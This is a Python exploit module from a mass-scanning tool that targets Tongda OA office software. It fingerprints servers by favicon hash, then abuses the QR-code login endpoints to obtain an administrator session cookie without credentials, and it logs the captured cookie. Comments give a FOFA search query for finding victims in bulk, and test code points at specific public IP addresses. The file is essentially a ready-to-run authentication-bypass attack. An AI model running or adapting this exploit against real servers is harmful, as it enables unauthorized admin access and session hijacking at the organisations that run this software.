# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 12:42

import hashlib
import json

from colorama import Fore
from tqdm import tqdm

from core.MyGlobalVariableManager import GlobalVariableManager
from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: title="通达OA网络智能办公系统"
# python batch.py -m exploit.web.OA.Tongda.any_user_login -cs -fs "title=\"通达OA网络智能办公系统\""

class Script(BaseScript):
    name = 'Tongda'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.ANYUSERLOGIN
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/general/login_code.php', '/ispirit/login_code.php']
        # session
        self.session = session
        # 相关信息
        self.info = '''
        通达OA 2017版
        通达OA版本  V11.X < V11.5
        '''
        self.favicon = ['ed0044587917c76d08573577c8b72883']

    async def detect(self):
        try:
            # 同类型多模块的识别规则
            checkList = GlobalVariableManager.getValue('exploitRule')[self.name]
            for checkTarget in checkList:
                if self.target == checkTarget:
                    tqdm.write(Fore.RED + '[{}] detect method skip...'.format('JBoss Finger'))
                    # 如果存在的话，那么当前这个target的框架已经探测完毕了，
                    # 就没必要再次探测，所以直接进入exec方法中，唯一需要变动的就是flag=True
                    self.flag = True
                    return None
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                checkList.append(self.target)
                                tqdm.write(Fore.RED + '[{}] {}'.format('Tongda Finger', url))
                                return {'name': 'Tongda Finger', 'url': url, 'software': 'Tongda'}
        except Exception:
            return None

    async def exec(self):
        try:
            # V11
            # url = f'http://{self.target}{self.execPathList[0]}' if self.target.startswith(
            #     ('http:', 'https:')) is False else f'{self.target}{self.execPathList[0]}'
            # async with session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
            #     if response is not None:
            #         text = await response.text()
            #         await asyncio.sleep(2)
            #         resText = str(text).split('{')
            #         codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
            #         url1 = f'http://{self.target}/logincheck_code.php' if self.target.startswith(
            #             ('http:', 'https:')) is False else f'{self.target}/logincheck_code.php'
            #         data1 = {'CODEUID': '{' + codeUid + '}', 'UID': 1}
            #         async with session.post(url1, data=data1, headers=self.headers) as response1:
            #             if response1.headers.get('Set-Cookie'):
            #                 tqdm.write(Fore.RED + '[{}] {} {}'.format('Tongda Any User Login', url1, response1.headers.get('Set-Cookie')))
            #                 return {'name': 'Tongda Any User Login - {}'.format(response1.headers.get('Set-Cookie')), 'url': url1, 'software': 'Tongda'}

            # V2017
            url2 = f'http://{self.target}{self.execPathList[1]}' if self.target.startswith(
                ('http:', 'https:')) is False else f'{self.target}{self.execPathList[1]}'
            async with self.session.get(url=url2, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response2:
                if response2 is not None:
                    resText2 = await response2.text()
                    await asyncio.sleep(2)
                    resText2 = json.loads(resText2)
                    codeUid = resText2['codeuid']
                    url3 = f'http://{self.target}/general/login_code_scan.php' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}/logincheck_code.php'
                    data = {'codeuid': codeUid, 'uid': 1, 'source': 'pc', 'type': 'confirm', 'username': 'admin'}
                    async with self.session.post(url3, data=data, headers=self.headers) as response3:
                        resText3 = await response3.text()
                        resText3 = json.loads(resText3)
                        status = resText3['status']
                        if status == str(1):
                            url4 = f'http://{self.target}/ispirit/login_code_check.php?codeuid={codeUid}' if self.target.startswith(
                                ('http:',
                                 'https:')) is False else f'{self.target}/ispirit/login_code_check.php?codeuid={codeUid}'
                            async with self.session.get(url=url4, timeout=self.reqTimeout, verify_ssl=False) as response4:
                                if response4.headers.get('Set-Cookie'):
                                    tqdm.write(Fore.RED + '[{}] {} {}'.format('Tongda Any User Login', url4,
                                                                              response4.headers.get('Set-Cookie')))
                                    return {'name': 'Tongda Any User Login - {}'.format(
                                        response4.headers.get('Set-Cookie')), 'url': url4, 'software': 'Tongda'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
